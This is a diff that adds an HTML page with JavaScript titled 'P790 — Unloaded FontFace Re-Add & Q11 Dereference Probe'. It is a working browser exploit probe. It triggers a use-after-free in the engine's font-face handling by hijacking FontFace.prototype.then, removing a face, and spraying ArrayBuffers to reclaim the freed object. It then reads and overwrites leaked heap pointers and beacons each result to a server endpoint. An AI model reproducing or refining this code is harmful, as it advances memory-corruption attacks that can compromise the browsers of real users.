@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P790 — Unloaded FontFace Re-Add & Q11 Dereference Probe</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin-top: 0; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+</style>
+<script>
+'use strict';
+window.onerror = function(msg, url, line, col, err){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P790-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P790-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+var P58 = 0n, P68 = 0n;
+var BUF_B = null, VIEW_B = null;
+var FACE_VICTIM = null;
+var FACE_TRIGGER = null;
+
+function run(){
+  OUT = document.getElementById('out');
+  log('=== P790 Unloaded FontFace Re-Add & Q11 Dereference Probe ===\n');
+  b('BOOT', 'start');
+
+  setupUnloadedUAF();
+}
+
+function setupUnloadedUAF(){
+  b('STEP1-SETUP', 'start');
+
+  // 1. Create sacrificial local FontFace with unicodeRange: U+0042 ('B')
+  // CRITICAL: Do NOT call .load() -> status stays 'unloaded'
+  FACE_VICTIM = new FontFace('vicFam', 'local(Arial)', { unicodeRange: 'U+0042' });
+  document.fonts.add(FACE_VICTIM);
+
+  // 2. Also create CSS @font-face rule for cssFam covering 'B'
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:cssFam;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  // Verify baseline unloaded oracle BEFORE any UAF
+  var preChkA = document.fonts.check('1em vicFam', 'A'); // out of range
+  var preChkB = document.fonts.check('1em vicFam', 'B'); // in range
+  b('BASELINE', 'status=' + FACE_VICTIM.status + '|chkA_out=' + preChkA + '|chkB_in=' + preChkB);
+  log('Baseline: FACE_VICTIM.status=' + FACE_VICTIM.status);
+  log('  check(vicFam, "A") [out-of-range]: ' + preChkA + ' (expected: true)');
+  log('  check(vicFam, "B") [in-range]: ' + preChkB + ' (expected: false)');
+
+  // 3. Local trigger FontFace (will load synchronously to fire .then)
+  FACE_TRIGGER = new FontFace('trigFam', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(FACE_TRIGGER);
+  void FACE_TRIGGER.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+
+      b('THEN-FIRED', 'victimStatus=' + FACE_VICTIM.status);
+
+      // Remove style rule
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+
+      // Delete FACE_VICTIM from document.fonts
+      try { document.fonts.delete(FACE_VICTIM); } catch(e){}
+      document.body.offsetHeight;
+
+      // Spray 64 ArrayBuffers (192B)
+      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
+
+      // Force FontSelector flush on cssFam
+      try { document.fonts.check('1em cssFam'); } catch(e){}
+      document.body.offsetHeight;
+
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  // Trigger: Only request trigFam and cssFam so vicFam remains UNLOADED
+  b('STEP2-LOAD', 'trigFam,cssFam');
+  document.fonts.load('1em trigFam, cssFam', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if (best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'bestNz=' + bestNz);
+      log('Reclaim missed: bestNz=' + bestNz);
+      return;
+    }
+
+    BUF_B = abs[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+    P58 = VIEW_B[11]; // q11: m_ranges.m_buffer
+    P68 = VIEW_B[13]; // q13: m_sources.m_buffer
+
+    var q0 = VIEW_B[0];
+    var q11 = VIEW_B[11];
+    var q12 = VIEW_B[12];
+    var q13 = VIEW_B[13];
+
+    b('RECLAIM-HIT', 'k=' + best + '|nz=' + bestNz + '|q0=0x' + h16(q0) +
+      '|p58=0x' + h16(P58) + '|q12=0x' + h16(q12) + '|p68=0x' + h16(P68));
+    log('Reclaim HIT: k=' + best + ' nz=' + bestNz);
+    log('  q0=0x' + h16(q0) + ' q11(p58)=0x' + h16(P58) + ' q12=0x' + h16(q12) + ' q13(p68)=0x' + h16(P68));
+
+    // Proceed to Step 3: Re-Add & Deref Verification
+    testReAddAndDeref();
+  }, 250);
+}
+
+function testReAddAndDeref(){
+  log('\n=== Step 3: Re-Add Unloaded FontFace & Oracle Test ===');
+
+  // 1. Status and checks BEFORE re-add
+  var preAddHas = document.fonts.has(FACE_VICTIM);
+  var preAddStatus = FACE_VICTIM.status;
+  var preAddChkA = document.fonts.check('1em vicFam', 'A');
+  var preAddChkB = document.fonts.check('1em vicFam', 'B');
+  b('T31-PRE-ADD', 'has=' + preAddHas + '|status=' + preAddStatus + '|chkA=' + preAddChkA + '|chkB=' + preAddChkB);
+  log('Pre-Add: has=' + preAddHas + ' status=' + preAddStatus + ' chkA=' + preAddChkA + ' chkB=' + preAddChkB);
+
+  // 2. RE-ADD FACE_VICTIM to document.fonts
+  var addErr = 'none';
+  try {
+    document.fonts.add(FACE_VICTIM);
+  } catch(e){
+    addErr = e.name + ':' + e.message;
+  }
+  var postAddHas = document.fonts.has(FACE_VICTIM);
+  var postAddStatus = FACE_VICTIM.status;
+
+  // 3. Status and checks AFTER re-add
+  var postAddChkA = document.fonts.check('1em vicFam', 'A');
+  var postAddChkB = document.fonts.check('1em vicFam', 'B');
+  b('T32-POST-ADD', 'addErr=' + addErr + '|has=' + postAddHas + '|status=' + postAddStatus +
+    '|chkA=' + postAddChkA + '|chkB=' + postAddChkB);
+  log('Post-Add: has=' + postAddHas + ' status=' + postAddStatus);
+  log('  chkA(out-of-range): ' + postAddChkA + ' (expected: true)');
+  log('  chkB(in-range): ' + postAddChkB + ' (expected: false if unloaded oracle active!)');
+
+  // 4. Step 4: Q11 Dereference Mutation Test
+  log('\n=== Step 4: Q11 Pointer Dereference Test ===');
+  var origQ11 = VIEW_B[11];
+  var origQ12 = VIEW_B[12];
+
+  // Zero q11
+  VIEW_B[11] = 0n;
+  var zeroChkA = document.fonts.check('1em vicFam', 'A');
+  var zeroChkB = document.fonts.check('1em vicFam', 'B');
+  var zeroCssA = document.fonts.check('1em cssFam', 'A');
+  var zeroCssB = document.fonts.check('1em cssFam', 'B');
+  b('T41-ZERO-Q11', 'origQ11=0x' + h16(origQ11) + '|vicA=' + zeroChkA + '|vicB=' + zeroChkB +
+    '|cssA=' + zeroCssA + '|cssB=' + zeroCssB);
+  log('q11=0x0: vicA=' + zeroChkA + ' vicB=' + zeroChkB + ' cssA=' + zeroCssA + ' cssB=' + zeroCssB);
+
+  // Restore q11
+  VIEW_B[11] = origQ11;
+  VIEW_B[12] = origQ12;
+  b('T42-RESTORED', 'q11=0x' + h16(VIEW_B[11]));
+  log('q11 restored: 0x' + h16(VIEW_B[11]));
+
+  b('DONE', 'probe-complete');
+  log('\n=== P790 COMPLETE ===');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  setTimeout(run, 0);
+} else {
+  document.addEventListener('DOMContentLoaded', run);
+}
+</script>
+</head>
+<body>
+  <h2>P790 — Unloaded FontFace Re-Add & Q11 Dereference Probe</h2>
+  <div id="status" class="status">Running probe...</div>
+  <pre id="out"></pre>
+</body>
+</html>
